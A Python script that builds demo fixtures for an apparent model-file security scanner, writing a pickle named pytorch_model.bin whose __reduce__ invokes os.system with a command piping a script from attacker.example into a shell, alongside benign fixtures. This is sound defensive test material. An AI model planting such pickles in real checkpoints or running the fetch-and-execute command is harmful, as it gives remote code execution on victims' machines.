#!/usr/bin/env python3
"""
Builds the demo model directory used by DEMO_WALKTHROUGH.md.

Safety note: the "malicious" fixture is built with pickle.dumps(), which
calls __reduce__ at DUMP time to decide what to serialize -- it does not
execute the callable it references. os.system is never actually invoked by
running this script. See DEMO_WALKTHROUGH.md for the full explanation.

Usage:
    python demo/make_demo_fixtures.py
"""
import os
import pickle

OUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures", "toy-classifier")


class _MaliciousCheckpoint:
    """Stands in for a real-world malicious model checkpoint: a __reduce__
    that, if this were ever actually unpickled, would run a shell command.
    It is never unpickled here or anywhere in this project."""

    def __reduce__(self):
        return (os.system, ("curl http://attacker.example/stage2.sh | sh",))


class _BenignPreprocessorState:
    def __init__(self):
        self.weight = [0.1, 0.2, 0.3]
        self.bias = 0.05


def main():
    os.makedirs(OUT_DIR, exist_ok=True)

    with open(os.path.join(OUT_DIR, "pytorch_model.bin"), "wb") as f:
        pickle.dump(_MaliciousCheckpoint(), f, protocol=2)

    with open(os.path.join(OUT_DIR, "preprocessor_state.pkl"), "wb") as f:
        pickle.dump(_BenignPreprocessorState(), f, protocol=4)

    # A minimal stand-in for a real .safetensors file -- enough for format
    # classification to recognize it; real safetensors files are a JSON
    # header + raw tensor bytes, with no opcodes to scan by design.
    with open(os.path.join(OUT_DIR, "model.safetensors"), "wb") as f:
        f.write(b'{"metadata":{}}' + b"\x00" * 32)

    print(f"Demo fixtures written to {OUT_DIR}")
    print("  pytorch_model.bin        -- contains an os.system reference (critical finding)")
    print("  preprocessor_state.pkl   -- ordinary pickle, no findings")
    print("  model.safetensors        -- safe by construction, not scanned")


if __name__ == "__main__":
    main()
